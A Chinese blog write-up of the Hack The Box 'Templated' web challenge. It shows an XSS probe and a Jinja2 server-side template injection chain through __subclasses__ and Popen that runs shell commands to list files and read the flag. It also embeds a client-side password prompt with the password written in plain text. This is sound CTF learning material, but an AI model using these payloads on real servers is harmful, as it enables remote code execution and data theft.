---
title: '[HTB] Templated | writeup'
date: 2021-12-15 16:54:33
tags: [HTB,web,刷题,靶场]
published: true
hideInList: false
feature: 
isTop: false
---

# Templated
是ssti漏洞.

但是之前学习burpsuite下的题目的时候,没有学到这个.之前了解过概念.于是我专门回顾和学习了一下jinja2

尝试访问不存在的路径:

    payload : /xyz

    response : 发现会回显xyz在页面中


<!-- more -->
<script language = JavaScript> function password() {

    var testV = 1;

    var pass1 = prompt('please input the password','');

    var passwordforthisarticle = "dhlove";

    var inputtimemax = 5;

    while (testV < inputtimemax) {

    if (!pass1)

    history.go(-1);

    if (pass1 == passwordforthisarticle) {

    break;

    }

    testV+=1;

    var pass1 =

    prompt('Password error!');

    }

    if (pass1!= passwordforthisarticle & testV == inputtimemax)  

    history.go(-1);

    return " ";

    }

    document.write(password());

</script>

既然会回显,那么尝试一下XSS来弹窗一下

    payload : /<img src=1 onerror=alert(1)>

    response : 按照预料,进行了弹窗

但是此时,依旧没有flag.根据题目描述,应该是必须要用到模板.

确认是否存在模板的注入

    payload :  /{{1+1}}

    response : 会回显计算结果2

接着,我又继续学习了针对jinja2的ssti相关的知识:https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti(推荐这篇文章,非常不错!)

确认Flask的模板引擎为jinja2

    payload :  /{{config}}

尝试使用ssti基础的注入方式,查看python环境下,""所属的类,及继承该类的全部类(其实这里结果是全部的类及子类):

    payload : /{{"".__class__.__mro__[1].__subclasses__()}}

    response : 返回python下mro[1]的全部类及其子类

> mro 在python官方的文档下的Sepcial Attributes中有定义

此时我们查找Popen的python公共方法([https://docs.python.org/zh-cn/3/library/subprocess.html](https://docs.python.org/zh-cn/3/library/subprocess.html))

对该处使用burpsuite的intruder进行遍历,计算popen位于__subclasses__的下标编号.发现是414(其实还有一种方法是利用python语的切片表达式来快速定位)


看文档关于Popen的使用,参数可以使用字符,也可以使用序列(例如列表).

看文档得知,调用的方式是实例化Popen类,并调用其下的communicate()方法.同时,要保证stdout为Popen.PIPE.而PIPE为一个特殊的数字,来代表这些标准输出标准输入etc.

其中communicate()方法是为了和子进程进行交互的

所以我们可以先使用`__globals__` 来获取更多信息.比如说查看一下PIPE的值到底是多少

> `__globals__` : 返回一个当前空间下能使用的模块，方法和变量的字典

    payload : {{''.__class__.__mro__[1].__subclasses__()[414].__init__.__globals__}}

    response : 浏览器中使用<c-f>,查看到PIPE的值为-1

那么,我们现在可以实例化类并调用方法了

先看一下当前路径下的文件

    payload :  /{{''.__class__.__mro__[1].__subclasses__()[414]('ls -lh',shell=True,stdout=-1).communicate()}}

    response : 在response中查看到有flag.txt的文件

然后使用cat命令,输出flag的内容

    response : /{{''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()}}

**最后**: 

这里使用的是Popen的方法进行任意命令执行的.也可以使用<class 'warnings.catch_warnings'>下的builtins 实现同样的目的

## Reference:

1. [https://www.youtube.com/watch?v=tv0We4MM7ic](https://www.youtube.com/watch?v=tv0We4MM7ic)
2. [https://souvikinator.netlify.app/blog/htb-web-l2/](https://souvikinator.netlify.app/blog/htb-web-l2/)